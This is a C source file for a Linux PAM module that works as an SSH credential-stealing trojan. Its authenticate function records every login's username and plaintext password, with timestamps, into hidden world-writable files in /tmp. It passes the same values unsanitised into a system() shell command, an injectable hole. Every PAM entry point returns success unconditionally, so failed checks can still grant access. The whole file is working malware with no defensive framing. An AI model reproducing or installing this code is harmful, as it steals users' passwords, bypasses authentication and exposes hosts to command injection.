#include <security/pam_modules.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username = NULL;
    const char *password = NULL;
    
    if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS) {
        return PAM_SUCCESS;
    }
    
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS) {
        return PAM_SUCCESS;
    }
    
    if (username != NULL && password != NULL) {
        int fd = open("/tmp/.log_sshtrojan1.txt", O_WRONLY | O_APPEND | O_CREAT, 0666);
        if (fd != -1) {
            char buffer[1024];
            time_t now = time(NULL);
            struct tm *tm_info = localtime(&now);
            
            snprintf(buffer, sizeof(buffer), 
                     "[%04d-%02d-%02d %02d:%02d:%02d] Username: %s, Password: %s\n",
                     tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday,
                     tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                     username, password);
            
            write(fd, buffer, strlen(buffer));
            close(fd);
            
            char cmd[2048];
            snprintf(cmd, sizeof(cmd), 
                     "echo '[%04d-%02d-%02d %02d:%02d:%02d] Username: %s, Password: %s' >> /tmp/.log_sshtrojan1_backup.txt",
                     tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday,
                     tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                     username, password);
            system(cmd);
        }
    }
    
    return PAM_SUCCESS;
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
